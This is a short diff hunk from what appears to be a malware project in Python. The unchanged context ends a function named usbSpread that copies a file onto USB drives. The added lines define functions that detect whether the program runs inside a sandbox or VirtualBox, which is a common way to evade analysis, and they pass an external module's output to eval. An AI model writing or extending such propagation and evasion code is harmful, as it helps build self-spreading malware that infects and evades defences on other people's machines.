@@ -143,3 +143,16 @@ def usbSpread(cpfile):
 			else:
 				drive_success.append(drive)
 	return drive_success
+
+# Check if file in SandBox
+def inSandBox():
+	require_module('system_status.exe')
+	status = command.system(modules_path + 'system_status.exe inSandbox')
+	return eval(status)
+
+
+# Check if file in VirtualBox
+def inVirtualBox():
+	require_module('system_status.exe')
+	status = command.system(modules_path + 'system_status.exe inVirtualBox')
+	return eval(status)
